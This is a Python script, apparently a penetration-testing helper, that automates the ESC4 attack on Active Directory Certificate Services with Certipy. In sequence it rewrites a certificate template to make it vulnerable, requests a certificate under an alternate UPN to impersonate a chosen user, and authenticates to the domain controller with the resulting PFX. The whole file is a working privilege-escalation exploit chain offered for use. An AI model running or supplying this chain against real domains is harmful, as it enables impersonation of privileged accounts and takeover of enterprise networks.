import argparse
import subprocess
import sys
import time

# Define colors
Bold = '\033[1m'
Red = '\033[0;31m'
Green = '\033[0;32m'
Blue = '\033[0;94m'
Yellow = '\033[0;93m'
Pink = '\033[0;95m'
NC = '\033[0m'  # No Color

# Function to execute shell commands
def run_command(command, retries=1):
    print(f"{Blue}{Bold}Executing:{NC} {' '.join(command)}")
    for attempt in range(1, retries + 1):
        try:
            result = subprocess.run(command, check=True, text=True, capture_output=True)
            print(f"{Green}{Bold}[SUCCESS]{NC} Command succeeded:")
            print(result.stdout)
            return result.stdout
        except subprocess.CalledProcessError as e:
            print(f"{Red}{Bold}[FAILED]{NC} Command failed (Attempt {attempt}/{retries}):")
            print(e.stderr)
            if attempt < retries:
                print(f"{Yellow}{Bold}[RETRYING]{NC} Retrying in 3 seconds...")
                time.sleep(3)
            else:
                print(f"{Red}{Bold}[ERROR]{NC} Command failed after {retries} attempts.")
                return None

# Main function
def main():
    parser = argparse.ArgumentParser(description="Automate ESC4 Workflow with Certipy.")

    # Adding arguments
    parser.add_argument('-t', '--template', required=True, help="Template name to make vulnerable")
    parser.add_argument('-ca', '--ca-server', required=True, help="CA server name")
    parser.add_argument('-ip', '--dc-ip', required=True, help="IP address of the Domain Controller")
    parser.add_argument('-host', '--target-host', required=True, help="DNS name of target host")
    parser.add_argument('-u', '--user', required=True, help="Username to authenticate with")
    parser.add_argument('-p', '--password', required=True, help="Password for the user")
    parser.add_argument('-upn', '--upn', required=True, help="Alternate UPN for certificate request, AKA the user you want to impersonate")
    parser.add_argument('-dns', '--dns', required=True, help="DNS for certificate request")
    parser.add_argument('-ns', '--ns', required=True, help="NS for certificate request")

    args = parser.parse_args()

    print(f"{Pink}{Bold}[*] Starting ESC4 Automation Workflow...{NC}")

    # Step 1: Make template vulnerable
    print(f"{Yellow}{Bold}[Step 1]{NC} Making template vulnerable...")
    run_command([
        "certipy", "template",
        "-template", args.template,
        "-target", args.target_host,
        "-dc-ip", args.dc_ip,
        "-u", args.user,
        "-p", args.password
    ])

    # Step 2: Request certificate
    print(f"{Yellow}{Bold}[Step 2]{NC} Requesting certificate...")
    result = run_command([
        "certipy", "req",
        "-u", args.user,
        "-p", args.password,
        "-ca", args.ca_server,
        "-target", args.target_host,
        "-dc-ip", args.dc_ip,
        "-template", args.template,
        "-upn", args.upn,
        "-ns", args.ns,
        "-dns", args.dns
    ], retries=2)

    if result is None or "Successfully requested certificate" not in result:
        print(f"{Yellow}{Bold}[Step 2 - Retry with Debug]{NC} Retrying with -debug flag...")
        run_command([
            "certipy", "req",
            "-u", args.user,
            "-p", args.password,
            "-ca", args.ca_server,
            "-target", args.target_host,
            "-dc-ip", args.dc_ip,
            "-template", args.template,
            "-upn", args.upn,
            "-ns", args.ns,
            "-dns", args.dns,
            "-debug"
        ])

    # Step 3: Authenticate using PFX
    print(f"{Yellow}{Bold}[Step 3]{NC} Authenticating using PFX file...")
    pfx_file = f"{args.upn.split('@')[0]}_{args.dc_ip}.pfx"
    auth_result = run_command([
        "certipy", "auth",
        "-pfx", pfx_file,
        "-dc-ip", args.dc_ip
    ])

    if auth_result is None or "No such file or directory" in auth_result:
        print(f"{Red}{Bold}[ERROR]{NC} Failed to authenticate using the PFX file. Ensure the certificate request was successful.")
        sys.exit(1)

    print(f"{Green}{Bold}[SUCCESS]{NC} ESC4 Workflow completed successfully!")

if __name__ == "__main__":
    main()
